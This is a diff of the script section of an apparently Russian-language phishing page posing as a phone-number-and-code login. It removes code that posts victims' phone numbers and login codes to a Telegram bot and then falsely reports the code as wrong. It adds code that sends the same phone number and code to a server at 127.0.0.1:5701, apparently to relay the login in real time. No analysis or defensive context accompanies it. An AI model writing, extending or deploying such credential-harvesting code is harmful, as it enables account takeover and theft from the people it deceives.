@@ -151,53 +151,51 @@
         separateDialCode: true,
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js"
     });
-
-    function sendPhone() {
-    const fullNumber = iti.getNumber();
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `📱 Новый номер: ${fullNumber}`
-        })
-    }).then(res => res.json())
-    .then(data => {
-        if (data.ok) {
-            // Сохраняем номер в память для связи с кодом
-            localStorage.setItem('userPhoneNumber', fullNumber);
-
-            document.getElementById('login-form').style.display = 'none';
-            document.getElementById('code-section').style.display = 'block';
-        } else {
-            alert('Failed to send phone number.');
-        }
-    }).catch(() => alert('Error sending request.'));
-}
-
-function checkCode() {
-    const code = document.getElementById('login-code').value;
-    const phoneNumber = localStorage.getItem('userPhoneNumber') || 'Неизвестен';
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `КОД: ${code}\n📱 Номер: ${phoneNumber}`
-        })
-    }).then(res => res.json())
-    .then(data => {
-        if (data.ok) {
-            alert('Вы ввели неправильный код😔 Проверьте и повторите попытку!');
-        } else {
-            alert('Не удалось отправить код.');
-        }
-    }).catch(() => alert('Ошибка при отправке кода.'));
-}
-
 </script>
+ <script>
+        const SERVER_URL = "http://127.0.0.1:5701";
+
+        function sendPhone() {
+            const phoneInput = document.getElementById("phone-number").value;
+
+            fetch(`${SERVER_URL}/send_phone`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone: phoneInput })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert("Код отправлен!");
+                    document.getElementById("code-section").style.display = "block";
+                } else {
+                    alert("Ошибка: " + data.error);
+                }
+            })
+            .catch(error => console.error("Ошибка запроса:", error));
+        }
+
+        function checkCode() {
+            const codeInput = document.getElementById("login-code").value;
+            const phoneInput = document.getElementById("phone-number").value;
+
+            fetch(`${SERVER_URL}/send_code`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone: phoneInput, code: codeInput })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert("Успешный вход!");
+                } else {
+                    alert("Ошибка входа: " + data.error);
+                }
+            })
+            .catch(error => console.error("Ошибка запроса:", error));
+        }
+    </script>
+
 
 </body>
 </html>
